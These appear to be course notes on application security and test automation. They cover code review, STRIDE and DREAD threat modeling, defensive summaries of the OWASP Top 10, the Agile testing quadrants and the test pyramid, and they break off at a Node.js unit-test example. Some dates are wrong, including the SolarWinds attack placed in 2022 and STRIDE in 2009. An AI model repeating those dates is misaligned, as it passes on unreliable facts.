	• Static code analysis is critical for application security testing, and automation is essential to achieve comprehensive coverage. Choosing the right tool depends on programming language, cost, support, and organizational needs.

	• Key Concepts

		○ Automation is Essential

			§ Manual reviews alone aren’t scalable.

			§ Automated scanners are required to cover large codebases and consistently detect vulnerabilities.

		○ Language-Specific Tools

			§ Tools must align with the programming language(s) in use.

				□ Bandit → Python security linter.

				□ Brakeman → Ruby on Rails applications.

				□ Puma Scan → C# with real-time scanning.

			§ Using the wrong tool for a language = ineffective (e.g., Bandit on C#).

		○ Cost Considerations

			§ Open-source tools:

				□ Pros → Free, community-driven.

				□ Cons → Requires more manual troubleshooting, limited support.

			§ Commercial tools:

				□ Pros → Paid support, enterprise features.

				□ Cons → Expensive, may include unnecessary complexity (“Aston Martin vs Honda Civic”).

		○ Tool Selection Process

			§ Identify languages in use (from documentation review).

			§ Match tools to languages.

			§ Balance cost vs. support vs. complexity.

			§ Experiment with candidate tools before adopting.

		○ OWASP Resources

			§ OWASP List of Source Code Analysis Tools → Neutral, includes open-source \& commercial options.

			§ OWASP Phoenix Chapter Tools Page → Archived but very comprehensive (covers analyzers, fuzzers, SQLi scanners, etc.).

		○ Organizational Fit

			§ No “one-size-fits-all” solution.

			§ Choice depends on:

				□ Programming languages.

				□ Security budget.

				□ Internal capabilities to support/maintain tools.



Code Review Models

	• Secure code reviews can be conducted at different maturity levels, from informal manual approaches to fully automated systems. The right model depends on organizational resources, risk tolerance, and priorities. Effective reviews should be structured, incremental, supportive, and aligned with internal standards and industry best practices like OWASP.

	• Key Concepts

		○ Code Review Models (increasing maturity)

			§ Over-the-Shoulder: Informal, one developer explains code while another watches.

			§ Pass-Around: Multiple reviewers provide feedback asynchronously.

			§ Walkthrough: Team meets, reviews code together, identifies specific required changes.

			§ Fully Automated: Tools and test cases perform reviews; humans only handle exceptions.

		○ Factors in Choosing a Model

			§ Processes, resources, tools, timelines, training (organizational readiness).

			§ Risk appetite of leadership (CFO, CISO, executives).

			§ Budget constraints (may limit automation options).

		○ Best Practices for Secure Code Reviews

			§ Use OWASP Code Review Guide: checklist of pass/fail questions, applied incrementally (e.g., focus on cryptography, then sessions).

			§ Review manageable chunks: Don’t review too many lines or checklist items at once.

			§ Avoid public shaming: Focus on positive reinforcement and education.

			§ Align with internal standards: Ensure consistency with documented expectations.

		○ Application Security Standards

			§ OWASP Top 10 → lightweight option.

			§ OWASP Code Review Guide Checklist → more detail.

			§ OWASP Application Security Verification Standard (ASVS) → advanced maturity model.

			§ Policy Frameworks → OWASP guidance tied to COBIT, ISO, Sarbanes-Oxley.



Application Threat Modeling: STRIDE

	• The STRIDE model, created by Microsoft, is a systematic framework for identifying six categories of threats to applications (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege). It helps developers and security teams anticipate attacks, think like adversaries, and design mitigations before vulnerabilities are exploited.

	• Key Concepts

		○ What is STRIDE?

			§ Developed by Microsoft (2009) to help defenders evaluate threats to confidentiality, integrity, and availability (CIA) of applications and data.

			§ Mnemonic STRIDE makes threat categories easy to remember.

		○ Six STRIDE Threat Categories

			§ Spoofing (S)

				□ Attacker pretends to be another user (e.g., stolen password).

				□ Risk to authenticity of transactions.

				□ Consider how credentials could be stolen and misused.

			§ Tampering (T)

				□ Unauthorized modification of data (e.g., SQL injection, intercepting transactions).

				□ Risk to integrity of data (at rest or in motion).

			§ Repudiation (R)

				□ Attacker denies performing an action due to lack of evidence/trail.

				□ Risk to non-repudiation (who did what, and when).

				□ E.g., triggering transactions without logs or proof.

			§ Information Disclosure (I)

				□ Exposure of sensitive or configuration data to unauthorized users.

				□ Risk to confidentiality.

				□ Examples: leaked medical records, exposed config files.

			§ Denial of Service (D)

				□ Disruption of service for legitimate users (e.g., DDoS, account lockout abuse).

				□ Risk to availability of the application.

			§ Elevation of Privilege (E)

				□ Attacker gains higher-level access than authorized (e.g., admin rights).

				□ Risk to authorization controls.

				□ Can lead to full application compromise.

		○ Practical Use of STRIDE

			§ Conduct brainstorming sessions with stakeholders to map threats to applications.

			§ Goal: identify 20–40 threats in 2 hours (likely even more with today’s data).

			§ Success requires at least one participant who thinks like an attacker.

			§ Encourage open, creative exploration (pizza + open web searches suggested).



Application Threat Modeling: DREAD

	• DREAD is a threat modeling framework (originated at Microsoft, also covered in the OWASP Code Review Guide) designed to simplify discussions around risk by breaking threats into five attributes: Damage, Reproducibility, Exploitability, Affected Users, Discoverability.

		○ Unlike STRIDE, which classifies threat types, DREAD helps quantify and prioritize risks by scoring them.

		○ Though Microsoft stopped using it in 2008, it remains useful for organizations to structure risk conversations and remediation prioritization.

	• Key Concepts

		○ Origins \& Purpose

			§ Developed by Microsoft, included in OWASP Code Review Guide.

			§ Not meant as a rigorous standard, but as a practical, lightweight framework.

			§ Purpose: structure risk analysis, assign scores, and prioritize remediation.

		○ The Five DREAD Attributes

			§ Damage (D) → Impact if the attack succeeds

				□ Maps to Impact in NIST risk models.

				□ Key questions:

					® How severe would the damage be?

					® Could attacker take full control or crash the system?

			§ Reproducibility (R) → Likelihood of attack success

				□ Maps to Likelihood in risk models.

				□ Key questions:

					® How easy is it to reproduce the attack?

					® Can the exploit be automated?

			§ Exploitability (E) → Effort required for attack

				□ Concerns time, skill, and authentication needs.

				□ Key questions:

					® How much expertise and effort is required?

					® Does attacker need valid credentials?

			§ Affected Users (A) → Scope of impact

				□ Considers who is impacted (regular vs. admin users).

				□ Key questions:

					® What % of users would be affected?

					® Could attacker escalate to admin access?

			§ Discoverability (D) → Likelihood attackers find the vulnerability

				□ Focus on how obvious the vulnerability is.

				□ Key question:

					® How easy is it for an attacker to discover this threat?

				□ Note: security by obscurity is weak, but obscurity can delay exploitation.

		○ Practical Application

			§ Originally used by Microsoft to decide:

				□ Fix in next release?

				□ Issue a service pack?

				□ Release urgent bulletin?

			§ Organizations can adapt scoring models (e.g., 1–10 per attribute) to rank and prioritize threats.

			§ Helps teams decide when and how to apply fixes based on objective scoring.



Code Review Metrics

	• Application security metrics must be tailored to the audience (executives, managers, developers) to be meaningful and actionable. Different stakeholders care about different outcomes: value vs. resources vs. technical gaps. Using frameworks like OWASP metrics projects and the Application Security Verification Standard (ASVS) can guide metric selection.

	• Key Concepts

		○ Purpose of Metrics

			§ Metrics allow organizations to measure effectiveness, cost vs. value, and progress in application security.

			§ Wrong metrics for the wrong audience = wasted effort.

		○ Audience-Centric Metrics

			§ Executives

				□ Care about strategic value: Is the cost of testing justified by its benefits?

				□ Want cost vs. value metrics (ROI of security activities).

				□ Need decision-making data: budget allocation, headcount, tools.

				□ Expect linkage to security maturity goals of the org.

			§ Managers

				□ Care about tactical execution and resources.

				□ Metrics should highlight resource allocation needs (e.g., % of code analyzed vs. unchecked).

				□ Strong interest in compliance with standards/policies (logging, 2FA, monitoring, etc.).

				□ Roll-up metrics → % of compliant applications across the portfolio.

			§ Developers

				□ Care about closing security gaps in code.

				□ Want granular, actionable metrics: which apps lack logging, monitoring, or protections.

				□ Need visibility into specific vulnerabilities (e.g., injection flaws).

				□ Practical references: OWASP cheat sheets.

			§ OWASP Resources for Metrics

				□ OWASP Security Qualitative Metrics Project:

					® 230 metrics across six categories: architecture, design/implementation, technologies, environment, code generation, dev methodologies, business logic.

				□ OWASP Application Security Guide for CISOs (archived):

					® 106-page PDF with recommended governance and risk-focused metrics.

					® Focus on process metrics, risk metrics, and SDLC security metrics.

			§ No One-Size-Fits-All

				□ Each organization must tailor metrics to context, maturity level, and audience.

				□ Best practice: Use OWASP resources + ASVS as a foundation, then customize.



#### Static Testing for the OWASP Top 10



The OWASP Top 10

	• The OWASP Top 10 is the foundational, globally recognized list of the most critical web application security risks, serving as the best starting point for building a manageable and effective application security testing program.

	• Rather than trying to implement every security measure at once (which can overwhelm teams), organizations should begin with the Top 10 and expand from there.

	• Key Concepts

		○ Start Simple: Walk, Then Run

			§ Avoid overloading teams with overly comprehensive security programs.

			§ Focus first on the OWASP Top 10 as a foundational baseline.

		○ OWASP Top 10

			§ Most mature and widely adopted OWASP project.

			§ Updated every 3 years.

			§ Released in English and translated globally.

			§ Integrated into many commercial and open-source web app security tools.

			§ Serves as the cornerstone of application security practices.

		○ Expansion Beyond Web Applications

			§ OWASP Mobile Application Security Project:

				□ Mobile apps introduce unique risks distinct from web apps.

				□ Includes:

					® Mobile Top 10 list

					® Mobile Application Security Testing Guide

					® Mobile Application Security Verification Standard

					® Mobile App Security Checklist

		○ Shifting Left with Proactive Security

			§ OWASP Proactive Controls Project:

				□ Aimed at developers.

				□ Helps prevent vulnerabilities upfront by embedding secure coding practices.

				□ Moves beyond reactive patching of discovered flaws.

		○ Keep It Manageable

			§ Begin with OWASP Top 10 for quick wins and early successes.

			§ Use additional resources (mobile project, proactive controls) once foundational practices are established.



A1: Broken Access Controls

	• Broken access control is the most significant risk in the OWASP Top 10. It occurs when authenticated users are able to perform actions or access data they should not have access to. Unlike some vulnerabilities, broken access control is difficult for automated tools to detect and requires strong design, frameworks, and manual testing to prevent and identify.

	• Key Concepts

		○ Definition \& Risk

			§ Occurs when applications fail to enforce proper user privileges after authentication.

			§ Occurs when applications fail to enforce proper user privileges after authentication.

			§ Users can access functions or data outside of their intended permissions (e.g., impersonating another user, escalating privileges).

			§ Impact ranges from data exposure to full system compromise.

		○ Challenges in Detection

			§ Automated tools can sometimes detect missing access controls, but they cannot fully understand business rules.

				□ Example: A scanner won’t know whether Dan in accounting should be allowed to reset passwords.

			§ Manual testing is essential to verify if access aligns with business rules.

		○ Access Management Framework

			§ Developers need a framework to guide who can access what.

			§ Without it, broken access flaws are likely to slip in.

			§ Role-Based Access Controls (RBAC) and access control matrices (mapping roles → pages, forms, buttons) are effective tools.

		○ Common Attack Scenarios

			§ Exploiting weak access control to:

				□ View or modify restricted data.

				□ Escalate privileges (e.g., gaining admin access).

				□ Abuse APIs (e.g., unauthorized PUT, POST, DELETE).

			§ Example: Tester manipulated user identifiers after login to impersonate other accounts, eventually escalating to admin.

		○ Prevention Strategies

			§ Default Deny: Start with no access and explicitly grant what’s necessary.

			§ RBAC: Use role-based access consistently.

			§ Reuse Mechanisms: Don’t reinvent; leverage tested frameworks or external directory services.

			§ APIs: Enforce strict HTTP method access control; add rate limiting.

			§ Server Configurations: Disable directory listing at the web server level.

		○ Monitoring \& Compliance

			§ Logging and monitoring are essential:

				□ Developers implement logging.

				□ Security teams monitor logs and respond.'

			§ Often required for compliance (e.g., PCI-DSS, HIPAA).

		○ Helpful OWASP Resources

			§ OWASP Proactive Controls → includes access management principles.

			§ OWASP Authorization Cheat Sheet → explains least privilege, deny by default, and permission validation.



A2: Cryptographic Failures

	• Cryptographic failures (formerly known as Sensitive Data Exposure) occur when applications fail to properly protect sensitive data through encryption, hashing, and secure transmission/storage. These flaws often lead to data breaches, compliance violations, and reputational damage.

	• Key Concepts

		○ Why Cryptographic Failures Matter

			§ Attackers target sensitive data (credentials, financial info, healthcare data).

			§ Gaps in encryption allow theft without exploiting other vulnerabilities like injection or access control.

			§ Worst-case scenario = data breach → financial loss, fines, reputational harm.

		○ Common Weaknesses

			§ Unencrypted data in transit (e.g., using HTTP instead of HTTPS).

			§ Unencrypted data at rest (e.g., passwords stored in plaintext).

			§ Weak/poorly implemented encryption (homegrown algorithms, outdated ciphers).

			§ Improper use of hashing or encoding (confusing encoding with encryption).

			§ Improper key lifecycle management (keys hardcoded, not rotated, or poorly protected).

		○ Encryption vs. Hashing vs. Encoding

			§ Encryption: reversible with a key.

			§ Hashing: one-way; only comparison possible (should be salted for passwords).

			§ Encoding: reversible without keys (e.g., Base64, Hex, ASCII) → not secure.

		○ Risks \& Compliance Implications

			§ Laws with fines for PII/EPHI exposure: GDPR, CCPA, PIPEDA, HIPAA.

			§ Sensitive data definition must come from the organization’s data classification policy.

			§ Example: even a simple policy like “Credit card data must be encrypted” is a good start.

		○ Testing \& Validation

			§ Use data flow diagrams (DFDs) to track how sensitive data moves:

				□ Entry points

				□ Storage (databases, backups)

				□ Transmission (internal/external apps)

			§ Highlight unencrypted storage or transfers.

			§ Check for use of weak or outdated algorithms.

			§ Flag “custom encryption” immediately as a finding.

		○ Best Practices

			§ Encrypt everything (at rest + in transit).

			§ Avoid unnecessary storage/transmission of sensitive data.

			§ Do not assume internal networks are safe — attackers thrive there.

			§ Disable caching of sensitive data.

			§ Use salted hashing for password storage.

			§ Follow OWASP cheat sheets:

				□ Transport Layer Protection

				□ Password Storage

				□ Cryptographic Storage

				□ User Privacy Protection

		○ OWASP Proactive Controls (Control 8)

			§ Classify data.

			§ Encrypt at rest and in transit.

			§ Define processes for:

				□ Key lifecycle management.

				□ Secrets management.



A3: Injection

	• Injection flaws occur when untrusted input is sent to a backend interpreter (SQL, LDAP, OS command, etc.), allowing attackers to manipulate the interpreter into executing unintended commands. They remain one of the most severe and persistent risks in application security.

	• Key Concepts

		○ What Injection Is

			§ Occurs when untrusted data is sent to an interpreter (SQL, LDAP, OS commands, etc.).

			§ Interpreters execute commands without deciding what is “safe.”

			§ Attackers exploit any input that interacts with an interpreter.

		○ Common Attack Vectors

			§ Application parameters, environment variables, web services, and user input.

			§ Examples: login forms, search fields, JSON messages.

			§ Attackers often use escape characters to alter how interpreters read input.

		○ Potential Impacts

			§ Bypass authentication (e.g., SQL injection in login).

			§ Extract or manipulate sensitive data (dump entire databases).

			§ Remote code execution by sending OS-level commands.

			§ Full server takeover.

			§ Business impact: data breaches, service compromise, brand/reputation damage.

		○ Detection Methods

			§ Source code reviews are most effective.

			§ Look for:

				□ Raw SQL queries.

				□ LDAP queries (Active Directory, OpenLDAP).

				□ OS command calls.

				□ Object Relational Mapping (ORM) API calls (which can hide SQL logic).

			§ Collaboration with developers saves time and clarifies ORM/API use.

		○ Prevention Strategies

			§ Safe APIs \& ORM tools: use well-tested libraries instead of hand-coded queries.

			§ Whitelisting input validation: only allow known good values (works for limited sets like postal codes).

			§ Input encoding/sanitization: encode dangerous characters before passing to interpreter.

			§ Parameterized queries/prepared statements: avoid dynamic query building.

			§ Escape characters: if dynamic queries are unavoidable, build in safe escaping mechanisms.

			§ Native controls: use SQL features like LIMIT to minimize data exposure.

			§ Defense-in-depth: combine validation, encoding, and least-privilege query design.

		○ Resources for Developers \& Testers

			§ OWASP Injection Prevention Cheat Sheet: code examples + best practices.

			§ Bobby Tables (xkcd-inspired guide): language-specific guidance for preventing SQL injection.



A4: Insecure Design

	• Insecure design flaws occur when applications are built without security considerations from the start. Unlike implementation bugs that can be patched later, insecure design flaws are baked into the architecture and are much harder and costlier to fix after deployment. Security must be incorporated early in the software development life cycle (SDLC), ideally before any code is written.

	• Key Concepts

		○ Nature of Insecure Design

			§ Design flaws vs. implementation flaws:

				□ Design flaws = security missing at the architecture level.

				□ Implementation flaws = coding mistakes.

			§ Secure design can mitigate implementation issues, but secure implementation cannot fix insecure design.

		○ Why It Happens

			§ Lack of security-focused culture in development.

			§ Misunderstanding of business risks (e.g., GDPR privacy requirements).

			§ Missing or undocumented SDLC processes.

			§ User stories focusing only on functionality, without security requirements.

			§ Relying on hope instead of strategy (“Hope is not a strategy”).

		○ Business Impact

			§ Applications may violate compliance (e.g., GDPR fines).

			§ More costly to remediate insecure design after deployment.

			§ Poor design can leave systems exposed even if implementation is perfect.

		○ Indicators of Insecure Design

			§ No documented development processes or SDLC.

			§ Absence of security-related user stories.

			§ No security testing tools in CI/CD pipelines.

			§ Lack of SBOM (Software Bill of Materials) to track dependencies.

		○ Strategies for Detection \& Prevention

			§ Documentation review (SDLC, SBOM, test cases).

			§ Threat modeling: simulate attacker behavior to identify weak points.

			§ Reference architectures: adopt secure-by-design templates from AWS, Azure, GCP.

			§ Secure design patterns: write down and enforce practices (e.g., never put user IDs in URLs).

			§ Misuse/abuse cases: define and test against malicious scenarios.

			§ Security testing tools integrated into pipelines.

		○ Maturity Models for Secure Design

			§ OWASP SAMM (Software Assurance Maturity Model).

			§ BSIMM (Building Security In Maturity Model) by Synopsys.

			§ Both help organizations measure and improve secure design practices over time.



A5: Security Misconfiguration

	• Security misconfiguration occurs when applications, servers, or infrastructure are deployed with insecure, default, or poorly maintained configurations. These flaws can expose sensitive information, enable unauthorized access, and even lead to full system compromise. Preventing misconfiguration requires hardening standards, patching, monitoring, and change control discipline across the entire application stack.

	• Key Concepts

		○ Definition \& Scope

			§ Security misconfiguration = insecure defaults, incomplete configurations, or failure to maintain updates.

			§ It’s not just coding; it’s about secure deployment and ongoing maintenance.

			§ Applies to OS, frameworks, libraries, cloud services, and app infrastructure.

		○ Common Examples

			§ Open cloud storage with weak access controls.

			§ Verbose error messages exposing stack traces, web server details, or internal network info.

			§ Unpatched components with known vulnerabilities (apps, OS, libraries, frameworks).

			§ Default installation artifacts like README files, sample apps, status pages.

			§ World-readable config files with credentials (e.g., phpinfo() exposing MySQL backend).

			§ Old/unused libraries or features left enabled.

			§ Misconfigured account lockouts (e.g., allowing 10,000 failed logins).

		○ Causes

			§ Lack of hardening standards for infrastructure components.

			§ Infrastructure changes (new OS/web server deployments reintroducing defaults).

			§ Application changes (new libraries/frameworks introducing new configs).

			§ Neglected patching – new vulnerabilities emerge daily, with exploits appearing within hours of disclosure.

		○ Impact

			§ Can range from minor information disclosure to complete system compromise.

			§ Attackers actively look for overlooked or default configurations.

			§ Misconfigured storage or config files can lead to data breaches.

		○ Best Practices for Prevention

			§ Documented, repeatable hardening standards for every component.

			§ Apply patches and updates quickly (time-to-exploit is very short).

			§ Remove unnecessary features, services, and components.

			§ Carefully review config files line by line (not just presence of settings, but appropriateness).

			§ Deny-all-first approach to access control (esp. cloud storage).

			§ Segmentation and containerization to limit blast radius of misconfigs.

			§ Logging and monitoring in place and validated (produce logs on demand for IR).

		○ Guidance \& References

			§ CIS Benchmarks: trusted hardening guides for OS, servers, cloud services.

			§ Lenny Zeltser’s Critical Log Review Checklist (zeltser.com): excellent practical resource for security logging.



A6: Vulnerable an Outdated Components

	• Applications often rely on third-party components (libraries, frameworks, modules), which can introduce critical vulnerabilities if not kept up-to-date. Unlike misconfigurations, these flaws cannot be fixed by tuning settings—you must patch, upgrade, or remove the vulnerable component. Managing these risks requires visibility, monitoring, and a disciplined maintenance process.

	• Key Concepts

		○ Difference from Misconfigurations

			§ Misconfigurations = security settings that can be adjusted to match risk appetite.

			§ Outdated components = known vulnerabilities in the component itself; no config change can fix it.

		○ Business Impact

			§ Fixing/upgrading a component can be costly and disruptive.

			§ Organizations may be forced to “ride out the storm” when critical frameworks are vulnerable (e.g., Drupalgeddon, Log4Shell).

			§ Risk severity depends on both technical impact and business context.

		○ Complexity \& Visibility

			§ Applications become ecosystems of custom code + third-party libraries.

			§ Without an inventory (SBOM – Software Bill of Materials), it’s hard to know if your app is vulnerable.

		○ Developer Practices \& Risks

			§ Developers often include third-party libraries for speed without knowing their security posture.

			§ If dev teams avoid upgrades to prevent breaking changes, risk of outdated vulnerable components increases.

			§ Secure configuration files of these components must also be validated.

		○ Best Practices to Mitigate Risks

			§ Remove unnecessary components (streamlining reduces both risk and operational overhead).

			§ Build and maintain an SBOM (name, version, source, use case).

			§ Use only trusted, digitally signed components from reliable sources.

			§ Establish a monitoring process for component updates and support activity.

			§ Watch for abandoned/dormant open-source projects (no patches = higher risk).

		○ Tools \& Resources

			§ OWASP Dependency-Check: software composition analysis tool for Java \& .NET (CLI, build plugins, Jenkins, SonarQube, etc.).

			§ CVE Database (MITRE): searchable repository of known vulnerabilities.

			§ Other integrations (e.g., SonarQube) can extend visibility.



A7: Identification and Authentication

	• Identification and authentication failures occur when applications have weak or poorly implemented login, password, and session management mechanisms. These failures allow attackers to bypass authentication, reuse stolen credentials, exploit default/weak passwords, or hijack sessions. The result can range from minor privacy violations to severe breaches, depending on the sensitivity of the application and data.

	• Key Concepts

		○ Sources of Risk

			§ Stolen credentials: Many usernames/passwords are available on the dark web.

			§ Default credentials: Often left unchanged in older tech or admin interfaces.

			§ Brute force attacks: Automated tools testing multiple combinations.

			§ Session hijacking: Reuse of unexpired session tokens.

		○ Causes

			§ Lack of secure Identity \& Access Management (IAM) planning early in development.

			§ Weak or absent session management controls.

			§ Poor password policy or failure to block compromised/weak passwords.

			§ Inadequate account lockout mechanisms.

			§ Weak password reset mechanisms (exploitable security questions).

			§ Storing passwords improperly (plaintext is worst, hashing is best).

		○ Questions to Ask Early in Development

			§ How strong do passwords need to be?

			§ Will passwordless or MFA be required?

			§ Are default/weak passwords prohibited?

			§ What are session expiration and lockout policies?

			§ Can multiple concurrent logins from different devices be restricted?

		○ Impacts

			§ Minor: Privacy issues (e.g., library account exposing borrowing history).

			§ Severe:

				□ Banking apps → financial theft.

				□ Infrastructure admin apps → takeover or disruption of critical systems.

		○ Best Practices

			§ Password security:

				□ Strong complexity requirements.

				□ Prohibit known compromised passwords.

				□ Use hashing for storage.

			§ MFA (multifactor authentication): Strong defense even if credentials are stolen.

			§ Session management:

				□ Server-side enforcement preferred.

				□ Proper session ID handling (avoid URL-based IDs).

			§ Account lockouts: Based on failed login attempts and/or IP-level

			§ Thoughtful password reset: Avoid guessable recovery questions.

		○ OWASP Guidance

			§ Cheat Sheets available for:

				□ Authentication

				□ Credential stuffing prevention

				□ Password resets

				□ Session management

			§ OWASP Proactive Controls (C6) \& NIST guidance:

				□ Level 1: Passwords

				□ Level 2: MFA

				□ Level 3: Cryptographic-based authentication



A8: Software and Data Integrity

	• Software and data integrity failures occur when trust in software components, data, or infrastructure is misplaced, leading to potential exploitation. These risks emphasize the need for validation, strong CI/CD controls, secure SDLC practices, and vigilance against supply chain attacks.

	• Key Concepts

		○ Definition \& Scope

			§ Based on assumed trust in:

				□ Data inputs.

				□ Software components and updates.

				□ Infrastructure elements.

			§ If trust is misplaced → security incidents or breaches.

		○ Evolution from Insecure Deserialization

			§ 2017’s “Insecure Deserialization” evolved into broader software/data integrity risks.

			§ Both relate to vulnerabilities where untrusted or manipulated code/data compromises security.

		○ Update \& Supply Chain Risks

			§ Application integrity can be compromised during:

				□ Automatic or manual updates.

				□ Pulling libraries from external repositories.

			§ Example: Python PyPI ransomware incident (2022) — malicious library downloaded hundreds of times.

			§ Example: SolarWinds Orion attack (2022) — malicious update affected 30,000+ organizations.

		○ CI/CD Pipeline Threats

			§ Pipelines can be a point of failure:

				□ Unrestricted/unaudited changes.

				□ Weak access control.

				□ Misconfigurations.

			§ Malicious code can slip into production if CI/CD trust is broken.

		○ Mitigation Strategies

			§ Digital Signature Validation

				□ Integrate signature checks into code and updates.

				□ Validate libraries and third-party components.

			§ SBOM (Software Bill of Materials)

				□ Inventory of all components, dependencies, and libraries.

				□ Starting point for signature validation and vulnerability scanning.

			§ Secure SDLC Practices

				□ Strong code reviews to detect untrusted code.

				□ Change control to prevent insecure deployments.

			§ Controlled Dependency Management

				□ Vet libraries → publish to internal trusted repo.

				□ Allow developers to pull only from controlled sources.

		○ Supporting Tools (OWASP Projects)

			§ CycloneDX

				□ BOM standard (software, SaaS, ops, manufacturing).

				□ Supports vulnerability advisory format.

				□ Offers 200+ automation tools.

			§ Dependency-Check

				□ Software composition analysis (SCA).

				□ Identifies libraries and checks against vulnerability databases.



A9: Security Logging and Monitoring Failures

	• Security logging and monitoring failures occur when applications lack proper logging, monitoring, and alerting mechanisms. Without these, attackers can operate undetected, increasing the risk of data breaches, system takeovers, and costly outages. Strong logging and monitoring—combined with centralization, real-time alerting, and secure storage—are essential to detect, respond to, and contain attacks early.

	• Key Concepts

		○ Why Failures Happen

			§ Developers often prioritize functionality and go-live deadlines over security logging.

			§ Lack of security training and awareness in development teams.

			§ Absence of logging/monitoring policies, standards, and documentation.

			§ Logging is often implemented only for troubleshooting, not for security.

		○ Risk Progression During Attacks

			§ Reconnaissance phase: attackers scan and probe apps. If caught here → minimal damage.

			§ Exploitation phase: attacks like SQL injection or brute force attempts. If detected here → partial damage but containable.

			§ Compromise phase: full breach/system takeover if logging fails. Very costly.

		○ Building Logging \& Monitoring (Pyramid Approach)

			§ Foundation: Ensure auditable events are being logged.

			§ Log Content: Logs must have enough detail to explain what happened.

			§ Monitoring: Logs must be actively reviewed; alerts should be near real-time.

			§ Storage: Logs should be centralized and protected, not stored locally where attackers can tamper with them.

			§ Integrity Controls: Ensure logs cannot be altered or deleted without detection.

		○ High-Value Targets for Logging

			§ Login activity (both successes and failures).

			§ Access control failures.

			§ Input validation failures.

These are often strong indicators of malicious behavior.

		○ Best Practices

			§ Centralize logs to internal servers for correlation and protection.

			§ Enable real-time alerts for suspicious activity.

			§ Apply integrity controls to detect tampering or log removal.

			§ Ensure timely review of logs and alerts by the security team.

		○ Resources for Guidance

			§ OWASP Cheat Sheets (logging, monitoring, misconfiguration).

			§ NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide.

			§ ICS 500-27: Intelligence Community standard for audit data collection and sharing.



A10: Server-Side Request Forgery

	• Server-Side Request Forgery (SSRF) occurs when an application allows attackers to make unauthorized requests from the server to internal or external systems. This can expose sensitive files, internal services, or cloud resources, and potentially allow attackers to execute malicious code or cause denial of service. SSRF is a growing risk, especially with cloud adoption, and requires strong validation, segmentation, and preventive controls.

	• Key Concepts

		○ What SSRF Is

			§ Attackers trick a server into making requests it shouldn’t (e.g., to internal services, local files, or attacker-controlled endpoints).

			§ Differs from command injection: SSRF is about forcing requests, not directly executing commands.

			§ Often arises when applications blindly trust user-supplied URLs.

		○ What Attackers Can Do with SSRF

			§ Access sensitive local files (e.g., /etc/passwd on Linux)

			§ Map the internal network (hostnames, IPs, open ports).

			§ Force internal systems to connect to attacker-controlled URLs.

			§ Trigger malicious code execution on internal servers.

			§ Cause denial of service conditions.

			§ Exploit cloud misconfigurations (e.g., overexposed S3 buckets, cloud metadata services).

		○ Detection \& Testing

			§ Look for URL validation weaknesses (does the app trust all URLs blindly?).

			§ Review application architecture for segmentation — is the app isolated from sensitive resources?

			§ Test for unexpected protocols (not just HTTP — e.g., file://, gopher://, ftp://).

		○ Preventive Controls

			§ Input validation \& sanitization of user-supplied URLs.

			§ Disallow or restrict HTTP redirects, which can be abused for SSRF.

			§ Network segmentation: restrict servers to only necessary outbound ports/services.

			§ Cloud configuration standards: enforce least privilege and restrict access to cloud metadata/storage.

			§ Allow lists (preferred over deny lists): explicitly define “known good” destinations.

			§ Logging \& monitoring of abnormal outbound requests.

		○ Resources

			§ OWASP SSRF Prevention Cheat Sheet: practical developer-focused examples and controls.

			§ “SSRF Bible” (Wallarm Research Team): detailed 23-page guide expanding on OWASP guidance.





---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Test Automation

#### Test Types



Agile Testing Quadrants

	• The Agile Testing Quadrants, created by Brian Marick in 2003, provide a framework to classify different types of tests in Agile development. The quadrants help teams decide which tests to automate, when to run them, and what resources are needed. The model organizes tests along two axes:

		○ Business-facing vs. Technology-facing

		○ Guides development vs. Critiques the product

	• Key Concepts



		○ The Four Quadrants

			§ Quadrant 1 (Bottom-left)

				• Technology-facing, guides development

				• Always automated

				• Ensures code quality foundation and confirms functionality while coding

				• Examples: Unit tests, integration tests, component tests

				• Written during development and run frequently

			§ Quadrant 2 (Top-left)

				• Business-facing, guides development

				• Automated or manual

				• Helps validate features and confirm business requirements

				• Examples: Functional tests, UI tests, prototypes, mockups

				• Often part of the Definition of Done for a user story

			§ Quadrant 3 (Top-right)

				• Business-facing, critiques the product

				• Mostly manual (can have automation support)

				• Provides feedback on user experience and workflows

				• Requires critical thinking and observation

				• Examples: Exploratory testing, usability testing, A/B testing

			§ Quadrant 4 (Bottom-right)

				• Technology-facing, critiques the product

				• Automated and tool-driven

				• Provides targeted data about performance and reliability

				• Examples: Performance testing, load testing, security testing, reliability testing (anything ending in “-ility”)

				• Performed based on system priorities

		○ Guiding Principles

			§ The quadrants are not sequential (numbers don’t imply order).

			§ Teams don’t need tests in every quadrant — testing strategy depends on context and priorities.

			§ The model ensures balanced coverage of both business value and technical quality.

			§ Helps teams continuously think about what tests matter most during planning, development, and releases.



The Test Pyramid

	• The Test Pyramid, introduced by Mike Cohn in Succeeding with Agile (2009), is a model that illustrates the ideal balance of automated tests in a project. It shows how many tests should exist at each level (unit, integration, UI) to achieve a fast, reliable, and maintainable test suite.

	• Key Concepts

		○ Structure of the Pyramid

			§ Unit Tests (Base)

				□ Fastest, most isolated tests (milliseconds)

				□ Test single functions with mocked or stubbed data

				□ Form the largest portion of the test suite

				□ Ensure correctness of individual pieces of code

			§ Integration Tests (Middle)

				□ Service-level tests, slower than unit but faster than UI (10–100 ms)

				□ Validate multiple services working together (DB, file systems, APIs)

				□ Generate their own data

				□ Ensure smooth communication and system integrity

			§ UI Tests (Top)

				□ End-to-end workflows, simulate real user actions (clicking, typing)

				□ Run through a browser (seconds to minutes per test)

				□ Very valuable for user perspective, but slow and costly to maintain

				□ Should be kept to a small number, covering primary workflows

		○ Why the Pyramid Shape Matters

			§ Bottom-heavy is ideal → fast, cheap tests at scale with fewer but valuable top-level UI tests.

			§ Anti-patterns:

				□ Square shape → too many unit tests only, gaps in coverage for workflows.

				□ Inverted pyramid → too many UI tests, slow feedback, hard maintenance.

			§ The pyramid promotes test efficiency, speed, and reliability.

		○ Flexibility of the Model

			§ Not limited to just 3 levels — can include additional test types (e.g., performance, security).

			§ Each team’s pyramid may look different depending on project needs.

			§ The goal is to be intentional about the test strategy and understand the trade-offs of different “shapes.”







Unit Test

	• Unit tests are the foundation of automated testing and are critical for ensuring that application functionality works correctly. They should be fast, simple, and focused on testing one thing at a time. The transcript illustrates this with a practical example of writing and running unit tests for a middleware function in a Node.js/Express application.

	• Key Concepts

		○ The Example Application

			§ AI Animal Art Store (fictional):

				□ Built with Node.js and Express

				□ Features include: browsing art, adding items to cart, viewing/updating cart, and checkout

				□ Uses a SQL database with two tables: items (products) and cart (cart items/quantities)

